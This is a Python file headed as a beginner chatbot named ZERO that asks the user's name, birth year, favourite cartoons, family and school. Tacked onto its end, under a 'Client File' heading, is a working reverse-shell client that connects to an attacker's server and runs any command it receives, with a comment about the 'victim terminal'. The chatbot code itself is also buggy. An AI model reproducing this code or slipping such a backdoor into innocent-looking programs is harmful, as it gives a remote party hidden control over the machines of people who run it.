# Project 1 Chatting bot ZERO


########## Greeting ###########

def greet():
    print("hello!! , how u doin buddy")


def year(age):
    if age <= 16:
        print(name, 'you are a kid')
    elif age <= 25:
        print("you have a really nice name", name)
    elif age >= 26:
        print("you have a really nice name", name)
    else:
        pass


greet()
print("I am ZERO")
name = input("what is your name ?")
print("I am created in 2021")

######## Asking about age #########


b = int(input("what year was u born "))
print()
print("what you was born on ", b, " Really")
c = 2021

try:
    if b < 2021:
        d = c - b
        year(d)

    else:
        pass
except:
    print("you must be joking")

########## After age equation #########

age = str(d)
if age == "5" or age <= "16":
    print('so what you watch cartoon or tv shows\n')
    e = input(">")
    if e == "cartoon":
        if e == "cartoon":
            cartoon_0 = input("what cartoon do you watch?\n")  # level 2
        cartoon_1 = print("ohh so u like watching ", cartoon_0, "that's cool")

        fav_char = input('who is your favourate character\n')
        print("ohh", fav_char, "that's coool, u are really cool kid\n")

        ########## Family info #################
        fam_0 = input("so who is in your family?\n")
        fam_0_1 = print("ohh so you have ", fam_0, "in your family\n")
        fam_1 = input("who is your favourate member of the family?\n")
        fam_1_1 = print("ohhk so", fam_1, "is your favourate\n")

        ############ school info #################
        school_0 = input("so what school you go?\n")
        school_0_1 = print(school_0, "hmm ok what class you in?\n")
        school_0_1_1 = input(">")
        school_0_2 = print("ohh so you in", school_0_1_1, "\n")

        print("ohhk buddy now i have to go , take some rest good bye!!!\n")
        bye = input("")

    elif e == "tv shows":
        g = input(print("what tv show you like to watch \n"))  # level 2

elif age >= "17":
    print('So what school u in? \n')
    school = input("")

elif age <= "27":
    print("okk! so what's new going on ?")

else:
    pass

############# Under construction ###########
"""
zero = 0
z = int(input("Enter the password"))
if zero == (2016 - z):
    print("The name of the subject is", )
"""







############## [+] Client Flie [+] #################


import socket
import os
import subprocess

s = socket.socket()
host = 'Server IP'
port = 'give a port same as attacker'
s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + ">"
        s.send(str.encode(output_str + currentWD))
        #print(output_str) #comment this string if u dont want output on the victim terminal
